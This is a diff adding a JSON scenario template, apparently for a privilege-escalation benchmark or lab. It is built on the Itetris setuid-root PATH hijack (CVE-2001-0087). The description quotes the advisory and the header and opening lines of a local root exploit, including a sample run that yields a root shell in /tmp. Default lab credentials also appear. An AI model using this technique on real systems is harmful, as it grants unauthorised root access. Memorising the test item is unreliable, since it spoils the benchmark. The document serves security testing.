@@ -1,0 +1,32 @@
+{
+  "template_id": "auto_edb_20517",
+  "category": "A1_suid_sgid",
+  "attack_technique": "T1548.001",
+  "cwe": "CWE-250",
+  "description": "Linux privilege escalation: Itetris 1.6.1/1.6.2 - Privileged Arbitrary Command Execution (CVE-2001-0087;OSVDB-13797)\n\nExploit source code (20517.c):\n```\n// source: https://www.securityfocus.com/bid/2139/info\n\nItetris, or \"Intelligent Tetris\", is a clone of the popular Tetris puzzle game for linux systems. The svgalib version of Itetris is installed setuid root so that it may access video hardware when run by a regular user. Itetris contains a vulnerability which may allow unprivileged users to execute arbitrary commands as root.\n\nItetris uses the system() function to execute gunzip when uncompressing font files. Unfortuntely it does so in a very insecure way -- relying on gunzip being located in directories specified in the PATH environment variable. It is possible to exploit this vulnerability if an attacker sets PATH to include a directory under his/her control in which a \"gunzip\" is found instead of or before the real location, eg:\n\nPATH=/tmp/hacker:$PATH\n\nAny program with the filename \"gunzip\" in /tmp/hacker would then be executed with Itetris' effective privileges. This vulnerability can be exploited to gain super user access and completely compromise the victim host.\n\n\n/* (*)itetris[v1.6.2] local root exploit, by: v9[v9@fakehalo.org].  this will\n   give you root on systems that have the itetris game installed.  the program\n   is installed setuid(0)/root due to svgalib.  this exploits a system() call\n   mixed with bad ../ protection, which makes this possible -- considering it\n   needs a font file to end with \".gz\" to run gunzip.\n\n   explaination(egafont.c):\n   ---------------------------------------------------------------------------\n   [199/360]:char *FontPath, *FontPath1;\n   ...\n   [237/360]:unzipped = strcasecmp(FontPath+fontheight-3, \".gz\");\n   ...\n   [246/360]:sprintf(FontPath1, \"gunzip -c %s > %s\", FontPath, tmp_file_name);\n   [247/360]:system(FontPath1);\n   ---------------------------------------------------------------------------\n\n   example:\n   ---------------------------------------------------------------------------\n   # cc xitetris.c -o xitetris\n   # ./xitetris\n   [ (*)itetris[v1.6.2] local root exploit, by: v9[v9@fakehalo.org]. ]\n   [*] checking /usr/local/bin/itetris for proper file permissions.\n   [*] done, /usr/local/bin/itetris appears to be setuid.\n   [*] done, making temporary files.\n   [*] done, setting up environment variable(s).\n   [*] done, launching /usr/local/bin/itetris. (the screen may blink locally)\n   [*] done, cleaning up temporary files.\n   [*] done, checking /tmp/rootsh for proper file permissions.\n   [*] success! /tmp/rootsh appears to be set*id.\n   [?] do you wish to enter the rootshell now(y/n)?: y\n   [*] ok, executing rootshell(/tmp/rootsh) now.\n   #\n   ---------------------------------------------------------------------------\n*/\n#define PATH            \"/usr/local/bin/itetris\"        // path to itetris.\n#define APPENDPATH      \"/tmp\"                          // tmp dir to use.\n#define EXECFILE        \"gunzip\"                        // don't change this.\n#define FAKEFILE        \"xitetris.gz\"                   // must end with .gz.\n#define SUIDSHELL   \n```",
+  "cve": "CVE-2001-0087;OSVDB-13797",
+  "exploitdb_id": "20517",
+  "feasibility": "L2",
+  "docker_run_args": [
+    "--privileged"
+  ],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_20517",
+      "type": "core",
+      "difficulty": "medium"
+    }
+  ]
+}
